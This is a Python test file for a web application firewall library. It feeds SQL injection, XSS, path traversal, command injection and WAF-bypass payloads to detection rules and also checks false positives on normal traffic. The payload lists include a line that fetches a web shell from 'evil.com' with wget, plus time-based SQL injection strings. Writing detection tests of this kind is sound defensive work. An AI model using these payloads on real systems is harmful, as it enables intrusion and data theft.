"""Test real attack detection using actual CRS rules.

This module tests that the WAF successfully detects attacks using real CRS rules
that are known to parse correctly.
"""

from __future__ import annotations

from lewaf.integration import WAF


class TestCRSAttackDetection:
    """Test attack detection using real CRS rules."""

    def test_detectsqli_operator(self):
        """Test the @detectSQLi operator with real SQL injection attacks."""
        # Simple rule using detectSQLi operator
        rules = [
            'SecRule ARGS "@detectSQLi" "id:942100,phase:2,block,msg:\'SQL Injection Detected\'"'
        ]

        waf = WAF({"rules": rules})

        # Test SQL injection attacks
        sqli_attacks = [
            "' OR '1'='1",
            "' UNION SELECT * FROM users--",
            "'; DROP TABLE users; --",
            "admin'--",
            "1' OR 1=1#",
        ]

        detected_count = 0
        for attack in sqli_attacks:
            tx = waf.new_transaction()
            tx.process_uri(f"/login?user={attack}&pass=test", "GET")

            interruption = tx.process_request_headers()
            if not interruption:
                interruption = tx.process_request_body()

            if tx.interruption:
                detected_count += 1
                print(f"✓ Detected SQL injection: {attack}")
            else:
                print(f"✗ Missed SQL injection: {attack}")

        assert detected_count > 0, (
            f"No SQL injections detected out of {len(sqli_attacks)} attempts"
        )
        detection_rate = detected_count / len(sqli_attacks)
        print(f"SQL injection detection rate: {detection_rate:.1%}")

    def test_detectxss_operator(self):
        """Test the @detectXSS operator with real XSS attacks."""
        # Simple rule using detectXSS operator
        rules = [
            'SecRule ARGS "@detectXSS" "id:941100,phase:2,block,msg:\'XSS Attack Detected\'"'
        ]

        waf = WAF({"rules": rules})

        # Test XSS attacks
        xss_attacks = [
            '<script>alert("xss")</script>',
            '<img src="x" onerror="alert(1)">',
            'javascript:alert("xss")',
            '<svg onload="alert(1)">',
            '<iframe src="javascript:alert(1)"></iframe>',
        ]

        detected_count = 0
        for attack in xss_attacks:
            tx = waf.new_transaction()
            tx.process_uri(f"/search?q={attack}", "GET")

            interruption = tx.process_request_headers()
            if not interruption:
                interruption = tx.process_request_body()

            if tx.interruption:
                detected_count += 1
                print(f"✓ Detected XSS: {attack}")
            else:
                print(f"✗ Missed XSS: {attack}")

        assert detected_count > 0, (
            f"No XSS attacks detected out of {len(xss_attacks)} attempts"
        )
        detection_rate = detected_count / len(xss_attacks)
        print(f"XSS detection rate: {detection_rate:.1%}")

    def test_simple_regex_rules(self):
        """Test simple regex-based rules for common attack patterns."""
        rules = [
            # SQL keywords
            'SecRule ARGS "@rx (?i)(union|select|insert|drop|delete)" "id:001,phase:2,block,msg:\'SQL Keywords\'"',
            # Script tags
            'SecRule ARGS "@rx (?i)<script" "id:002,phase:2,block,msg:\'Script Tag\'"',
            # Path traversal
            'SecRule ARGS "@rx \\.\\./.*\\.\\." "id:003,phase:2,block,msg:\'Path Traversal\'"',
            # Command injection
            'SecRule ARGS "@rx [;|&].*cat" "id:004,phase:2,block,msg:\'Command Injection\'"',
        ]

        waf = WAF({"rules": rules})

        # Test attack patterns
        test_cases = [
            ("union_sqli", "' UNION SELECT password FROM users", True),
            ("script_xss", "<script>alert(1)</script>", True),
            ("path_traversal", "../../../etc/passwd", True),
            ("command_injection", "test; cat /etc/passwd", True),
            ("normal_input", "hello world", False),
            ("legitimate_script", "JavaScript programming tutorial", False),
        ]

        results = []
        for test_name, attack, should_detect in test_cases:
            tx = waf.new_transaction()
            tx.process_uri(f"/test?input={attack}", "GET")

            interruption = tx.process_request_headers()
            if not interruption:
                interruption = tx.process_request_body()

            detected = tx.interruption is not None
            results.append((test_name, attack, should_detect, detected))

            if should_detect and detected:
                print(f"✓ Correctly detected: {test_name}")
            elif not should_detect and not detected:
                print(f"✓ Correctly allowed: {test_name}")
            elif should_detect and not detected:
                print(f"✗ Missed attack: {test_name}")
            else:
                print(f"✗ False positive: {test_name}")

        # Calculate accuracy
        correct = sum(
            1 for _, _, should_detect, detected in results if should_detect == detected
        )
        accuracy = correct / len(results)
        print(f"Overall accuracy: {accuracy:.1%}")

        assert accuracy >= 0.8, f"Low accuracy: {accuracy:.1%}"

    def test_method_enforcement(self):
        """Test HTTP method enforcement rules."""
        rules = [
            'SecRule REQUEST_METHOD "!@within GET POST HEAD PUT DELETE OPTIONS" '
            "\"id:911100,phase:1,block,msg:'Method not allowed'\""
        ]

        waf = WAF({"rules": rules})

        # Test different HTTP methods
        test_methods = [
            ("GET", True),
            ("POST", True),
            ("HEAD", True),
            ("PUT", True),
            ("DELETE", True),
            ("OPTIONS", True),
            ("TRACE", False),
            ("CONNECT", False),
            ("PROPFIND", False),
            ("HACK", False),
        ]

        results = []
        for method, should_allow in test_methods:
            tx = waf.new_transaction()
            tx.process_uri("/test", method)

            interruption = tx.process_request_headers()
            if not interruption:
                interruption = tx.process_request_body()

            blocked = tx.interruption is not None
            allowed = not blocked

            results.append((method, should_allow, allowed))

            if should_allow and allowed:
                print(f"✓ Correctly allowed method: {method}")
            elif not should_allow and blocked:
                print(f"✓ Correctly blocked method: {method}")
            elif should_allow and blocked:
                print(f"✗ Incorrectly blocked allowed method: {method}")
            else:
                print(f"✗ Failed to block dangerous method: {method}")

        # Check that dangerous methods are blocked
        dangerous_methods = [
            method for method, should_allow in test_methods if not should_allow
        ]
        blocked_dangerous = sum(
            1
            for method, should_allow, allowed in results
            if not should_allow and not allowed
        )

        if dangerous_methods:
            block_rate = blocked_dangerous / len(dangerous_methods)
            print(f"Dangerous method block rate: {block_rate:.1%}")
            assert block_rate >= 0.75, (
                f"Too many dangerous methods allowed: {block_rate:.1%}"
            )

    def test_encoding_detection(self):
        """Test detection of attacks with various encodings."""
        rules = [
            'SecRule ARGS "@detectSQLi" "id:001,phase:2,block,t:urlDecodeUni,msg:\'SQL Injection\'"',
            'SecRule ARGS "@detectXSS" "id:002,phase:2,block,t:htmlEntityDecode,msg:\'XSS Attack\'"',
        ]

        waf = WAF({"rules": rules})

        # Test encoded attacks
        encoded_attacks = [
            # URL encoded SQL injection
            ("url_encoded_sqli", "%27%20OR%20%271%27%3D%271", "sqli"),
            # HTML entity encoded XSS
            ("html_entity_xss", "&lt;script&gt;alert(1)&lt;/script&gt;", "xss"),
            # Normal attacks for comparison
            ("normal_sqli", "' OR '1'='1", "sqli"),
            ("normal_xss", "<script>alert(1)</script>", "xss"),
        ]

        detected_count = 0
        for test_name, attack, attack_type in encoded_attacks:
            tx = waf.new_transaction()
            tx.process_uri(f"/test?input={attack}", "GET")

            interruption = tx.process_request_headers()
            if not interruption:
                interruption = tx.process_request_body()

            if tx.interruption:
                detected_count += 1
                print(f"✓ Detected {attack_type}: {test_name}")
            else:
                print(f"✗ Missed {attack_type}: {test_name}")

        detection_rate = detected_count / len(encoded_attacks)
        print(f"Encoded attack detection rate: {detection_rate:.1%}")

        # Should detect at least the normal attacks
        assert detected_count >= 2, (
            f"Failed to detect basic attacks: {detected_count}/{len(encoded_attacks)}"
        )

    def test_real_world_payloads(self):
        """Test detection of real-world attack payloads."""
        rules = [
            'SecRule ARGS "@detectSQLi" "id:001,phase:2,block,msg:\'SQL Injection\'"',
            'SecRule ARGS "@detectXSS" "id:002,phase:2,block,msg:\'XSS Attack\'"',
            'SecRule ARGS "@rx \\.\\./.*etc/passwd" "id:003,phase:2,block,msg:\'LFI Attack\'"',
        ]

        waf = WAF({"rules": rules})

        # Real-world attack payloads
        real_payloads = [
            # SQL injection from real attacks
            "admin' AND (SELECT * FROM (SELECT(SLEEP(5)))B)#",
            "1' AND EXTRACTVALUE(rand(),CONCAT(0x3a,(SELECT DATABASE())))#",
            # XSS from real attacks
            "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
            "<svg onload=alert(/XSS/)>",
            # LFI from real attacks
            "../../../etc/passwd",
            "....//....//....//etc//passwd",
            # Command injection attempts
            "; wget http://evil.com/shell.php",
            "| nc -l 4444",
            # Combination attacks
            "'; DROP TABLE users; SELECT '<script>alert(1)</script>'--",
        ]

        detected_count = 0
        for payload in real_payloads:
            tx = waf.new_transaction()
            tx.process_uri(f"/vulnerable?input={payload}", "GET")

            interruption = tx.process_request_headers()
            if not interruption:
                interruption = tx.process_request_body()

            if tx.interruption:
                detected_count += 1
                print(f"✓ Detected real-world payload: {payload[:50]}...")
            else:
                print(f"✗ Missed real-world payload: {payload[:50]}...")

        detection_rate = detected_count / len(real_payloads)
        print(f"Real-world payload detection rate: {detection_rate:.1%}")

        # Should detect a reasonable percentage of real attacks
        assert detection_rate >= 0.3, (
            f"Very low detection rate for real payloads: {detection_rate:.1%}"
        )

    def test_legitimate_traffic_allowance(self):
        """Test that legitimate traffic is not blocked."""
        rules = [
            'SecRule ARGS "@detectSQLi" "id:001,phase:2,block,msg:\'SQL Injection\'"',
            'SecRule ARGS "@detectXSS" "id:002,phase:2,block,msg:\'XSS Attack\'"',
            'SecRule ARGS "@rx \\.\\./.*etc" "id:003,phase:2,block,msg:\'Path Traversal\'"',
        ]

        waf = WAF({"rules": rules})

        # Legitimate traffic samples
        legitimate_requests = [
            "/search?q=python programming",
            "/profile?name=John Doe&email=john@example.com",
            "/blog/post?title=SQL Database Design Tips",
            "/forum?topic=JavaScript best practices",
            "/docs?section=API documentation",
            "/contact?message=Hello, I need help with my account",
            "/shop?category=electronics&sort=price",
            "/news?article=Technology trends 2024",
        ]

        blocked_count = 0
        for request in legitimate_requests:
            tx = waf.new_transaction()
            tx.process_uri(request, "GET")

            interruption = tx.process_request_headers()
            if not interruption:
                interruption = tx.process_request_body()

            if tx.interruption:
                blocked_count += 1
                print(f"✗ False positive - blocked legitimate request: {request}")
            else:
                print(f"✓ Correctly allowed legitimate request: {request}")

        false_positive_rate = blocked_count / len(legitimate_requests)
        print(f"False positive rate: {false_positive_rate:.1%}")

        # Should have very low false positive rate
        assert false_positive_rate <= 0.2, (
            f"High false positive rate: {false_positive_rate:.1%}"
        )

    def test_bypass_attempt_detection(self):
        """Test detection of common WAF bypass techniques."""
        rules = [
            'SecRule ARGS "@detectSQLi" "id:001,phase:2,block,t:urlDecodeUni,msg:\'SQL Injection\'"',
            'SecRule ARGS "@detectXSS" "id:002,phase:2,block,t:htmlEntityDecode,msg:\'XSS Attack\'"',
        ]

        waf = WAF({"rules": rules})

        # Common bypass techniques
        bypass_attempts = [
            # Case variation
            "' Or '1'='1",
            "' oR 1=1--",
            # Comment insertion
            "'/**/OR/**/1=1--",
            # Quote variation
            '"OR"1"="1',
            # Encoding variations
            "%27%20OR%20%271%27%3D%271",  # URL encoded
            "&#39; OR &#39;1&#39;=&#39;1",  # HTML entity encoded
            # XSS bypass attempts
            "<ScRiPt>alert(1)</ScRiPt>",
            '<img src="x" onerror="alert(1)">',
            "javascript:alert(1)",
        ]

        detected_count = 0
        for bypass in bypass_attempts:
            tx = waf.new_transaction()
            tx.process_uri(f"/test?input={bypass}", "GET")

            interruption = tx.process_request_headers()
            if not interruption:
                interruption = tx.process_request_body()

            if tx.interruption:
                detected_count += 1
                print(f"✓ Detected bypass attempt: {bypass}")
            else:
                print(f"✗ Bypass attempt succeeded: {bypass}")

        detection_rate = detected_count / len(bypass_attempts)
        print(f"Bypass detection rate: {detection_rate:.1%}")

        # Should detect most bypass attempts
        assert detection_rate >= 0.5, (
            f"Many bypass attempts succeeded: {detection_rate:.1%}"
        )
